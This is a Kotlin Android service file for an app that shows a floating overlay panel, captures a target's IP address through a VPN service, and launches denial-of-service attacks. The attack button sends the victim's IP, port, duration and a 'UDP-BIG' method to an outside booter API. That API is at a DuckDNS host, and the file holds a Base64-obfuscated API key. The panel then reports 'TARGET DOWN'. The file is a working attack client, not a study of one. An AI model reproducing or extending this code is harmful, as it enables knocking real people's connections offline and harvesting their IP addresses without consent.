package com.teamjadugar.apk

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.net.VpnService
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.*
import java.net.HttpURLConnection
import java.net.URL

class FloatingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var etIp: EditText
    private lateinit var etPort: EditText
    private lateinit var tvTime: TextView
    private lateinit var tvLog: TextView
    private lateinit var btnAttack: Button
    private var selectedTime = 120

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null

        fun onIpFound(fullIp: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(fullIp)
                Toast.makeText(instance, "IP Caught: $fullIp", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, 
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 50
        params.y = 150

        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
        windowManager.addView(floatingView, params)

        etIp = floatingView.findViewById(R.id.fEtIp)
        etPort = floatingView.findViewById(R.id.fEtPort)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        tvLog = floatingView.findViewById(R.id.tvLog)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        
        etIpRef = etIp

        val btnGetIp = floatingView.findViewById<Button>(R.id.fBtnGetIp)
        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
        val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)

        btnClose.setOnClickListener { stopSelf() }

        seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = 60 + (progress * 10) 
                tvTime.text = "SESSION DURATION: ${selectedTime}s"
            }
            override fun onStartTrackingTouch(seekBar: SeekBar?) {}
            override fun onStopTrackingTouch(seekBar: SeekBar?) {}
        })

        btnGetIp.setOnClickListener {
            tvLog.text = "> SNIFFING VPN..."
            tvLog.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
            
            val intent = VpnService.prepare(this)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                startService(Intent(this, VpnService::class.java))
            }
        }

        btnVpnOff.setOnClickListener {
            stopService(Intent(this, VpnService::class.java))
            tvLog.text = "> VPN STOPPED"
            tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
        }

        btnAttack.setOnClickListener {
            val ip = etIp.text.toString().trim()
            val port = etPort.text.toString().trim()
            if (ip.isEmpty() || port.isEmpty()) {
                Toast.makeText(this, "IP or Port missing!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnAttack.text = "LAUNCHING..."
            btnAttack.isEnabled = false
            tvLog.text = "> ATTACK SENT [${selectedTime}s]"
            
            fireDirectAttack(ip, port, selectedTime)
        }
    }

    private fun fireDirectAttack(ip: String, port: String, time: Int) {
        Thread {
            try {
                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                val decryptedApiKey = String(Base64.decode("c3BfbGl2ZV8wNjVhMzE4MDc4ZjNlZmMxOWUwYmU3MjAxMDJlOWE3ZQ==", Base64.DEFAULT))

                val url = URL(apiUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", decryptedApiKey)
                conn.doOutput = true

                val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
                conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }

                val responseCode = conn.responseCode
                
                Handler(Looper.getMainLooper()).post {
                    if (responseCode == 200 || responseCode == 201) {
                        btnAttack.text = "LAUNCHED!"
                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                        tvLog.text = "> SUCCESS! TARGET DOWN"
                        Toast.makeText(this@FloatingService, "Attack Success!", Toast.LENGTH_SHORT).show()
                    } else {
                        btnAttack.text = "LAUNCH 🚀"
                        btnAttack.isEnabled = true
                        tvLog.text = "> ERROR: $responseCode"
                        tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                    }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    btnAttack.text = "LAUNCH 🚀"
                    btnAttack.isEnabled = true
                    tvLog.text = "> NETWORK FAIL"
                    tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                }
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::floatingView.isInitialized) {
            windowManager.removeView(floatingView)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
